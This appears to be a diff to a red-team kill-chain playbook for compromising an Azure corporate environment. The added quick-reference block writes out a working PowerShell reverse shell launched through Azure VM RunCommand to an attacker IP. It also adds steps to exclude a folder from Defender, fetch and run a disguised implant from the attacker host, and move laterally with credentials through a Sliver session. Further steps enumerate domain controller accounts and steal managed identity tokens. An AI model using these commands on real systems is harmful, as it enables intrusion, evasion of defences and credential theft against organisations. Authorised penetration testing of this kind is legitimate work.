@@ -2,6 +2,35 @@
 
 Engagement-proven kill chain. Every command validated live. Follow in order.
 
+## ⚡ Quick Reference (Speed Run)
+
+```bash
+# 1. Auth
+az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT
+
+# 2. Reverse shell (replace YOUR_KALI_IP)
+az vm run-command create --name "sh-$(date +%s)" --vm-name TARGET_VM \
+  --resource-group RG --async-execution true --timeout-in-seconds 86400 \
+  --script '$c=New-Object Net.Sockets.TcpClient("YOUR_KALI_IP",8080);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object IO.StreamReader($s);while($c.Connected){$cmd=$r.ReadLine();if($cmd -eq "exit"){break};try{$o=iex $cmd 2>&1|Out-String;$w.Write($o)}catch{$w.Write($_.Exception.Message)};$w.Write("> ")}'
+
+# 3. Defender exclusion + drop implant (from shell)
+Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Network"
+Invoke-WebRequest -Uri "http://YOUR_KALI_IP:8888/teams.exe" -OutFile "C:\ProgramData\Microsoft\Network\teams.exe"
+Start-Process "C:\ProgramData\Microsoft\Network\teams.exe"
+
+# 4. Lateral (from Sliver session on httpserver)
+execute -o powershell -c "Invoke-Command -ComputerName blueDBServer -Credential (New-Object PSCredential('contoso\svc.mssql',(ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force))) -ScriptBlock {whoami}"
+
+# 5. DC dump via RunCommand
+az vm run-command create --name "dc-$(date +%s)" --vm-name blueDC-01 \
+  --resource-group RG --timeout-in-seconds 120 \
+  --script "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties ServicePrincipalName | Select Name,SamAccountName,Enabled,ServicePrincipalName | FT"
+```
+
+---
+
+## Full Kill Chain
+
 ```
 Kali Setup (build Sliver, import profile, start listener)
    |
@@ -49,6 +78,23 @@ DB access, DC takeover via RunCommand, Entra Connect enum
 | Resource Group | RGCORPSERVERS |
 
 **Critical**: All VMs have NO outbound internet. RunCommand is the only way in.
+
+---
+
+## Step 0: Prerequisites
+
+### Install Az CLI (Kali/Linux)
+
+```bash
+curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
+```
+
+### Install Az PowerShell Module (Windows)
+
+```powershell
+Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser
+Import-Module Az
+```
 
 ---
 
@@ -180,18 +226,7 @@ Get-AzVM -ResourceGroupName "RGCORPSERVERS" | Format-Table Name, Location, Provi
 Get-AzRoleAssignment -SignInName "CLIENT_ID" | Format-Table RoleDefinitionName, Scope
 ```
 
-### 3e: Install Az CLI / Az PowerShell Module
-
-```bash
-# Kali/Ubuntu — Az CLI
-curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
-```
-
-```powershell
-# Windows/PowerShell — Az Module
-Install-Module -Name Az -Repository PSGallery -Force -Scope CurrentUser
-Import-Module Az
-```
+> **Note**: Az CLI and Az PowerShell installation moved to Step 0 (Prerequisites).
 
 ---
 
@@ -595,7 +630,9 @@ Invoke-AzVMRunCommand -ResourceGroupName "RGCORPSERVERS" -VMName "blueDC-01" `
 
 ### 12d: Managed Identity Tokens
 
-Steal MI tokens from any VM with managed identity assigned:
+Steal MI tokens from any VM with managed identity assigned.
+
+> **Important**: Not all VMs have managed identities. Check first with `az vm identity show --name VM --resource-group RG`. If the VM has no identity assigned, the IMDS token endpoint will return 400. System-assigned and user-assigned identities both work — system-assigned is more common. The stolen token inherits whatever RBAC roles the managed identity has (often Contributor on the subscription).
 
 **Az CLI:**
 ```bash
